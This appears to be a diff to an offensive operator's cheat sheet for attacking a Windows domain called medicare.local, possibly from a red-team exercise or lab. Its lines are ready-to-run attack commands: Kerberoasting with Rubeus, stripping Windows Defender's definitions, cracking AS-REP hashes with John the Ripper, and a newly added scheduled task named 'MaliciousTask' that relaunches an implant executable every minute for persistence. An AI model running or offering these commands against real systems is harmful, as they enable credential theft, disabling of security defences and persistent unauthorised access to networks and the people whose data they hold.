@@ -61,3 +61,5 @@ rubeus kerberoast /spn:http_svc /domain:medicare.local /dc:dc.medicare.local /us
 execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ## dehash asrep
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep hash
+## schedule task
+execute -o powershell -c "schtasks /create /tn "MaliciousTask" /tr "C:\Users\Administrator\Downloads\SLIMY_UNIFORM.exe" /sc minute /mo 1"
